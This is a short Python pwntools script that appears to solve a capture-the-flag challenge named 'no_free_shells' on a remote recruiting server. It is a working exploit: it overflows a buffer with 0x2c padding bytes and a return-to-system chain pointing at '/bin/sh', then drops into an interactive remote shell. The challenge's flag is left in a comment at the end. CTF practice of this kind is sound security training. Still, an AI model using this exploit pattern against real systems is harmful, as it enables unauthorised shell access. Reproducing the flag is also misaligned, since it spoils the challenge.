from pwn import *

# context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h', '-f']

# p = gdb.debug('./no_free_shells', '''
#     set follow-fork-mode parent
#     b main
#     b *(vuln+50)
#     continue
# ''')

p = remote('recruit.osiris.bar', 21004)

e = ELF('./no_free_shells')
chain = [
    e.plt.system,
    0xdeadbeef,
    next(e.search(b"/bin/sh"))
]

print(p.recvuntil(b"Now get a /bin/sh\n").decode())
msg = b"A" * 0x2c + b"".join([p32(c) for c in chain])
p.sendline(msg)
log.info(f"Sending message in raw bytes: {msg}")

p.interactive()

# flag{n0_fr33_sh3llz_but_some_pr3_r0p}
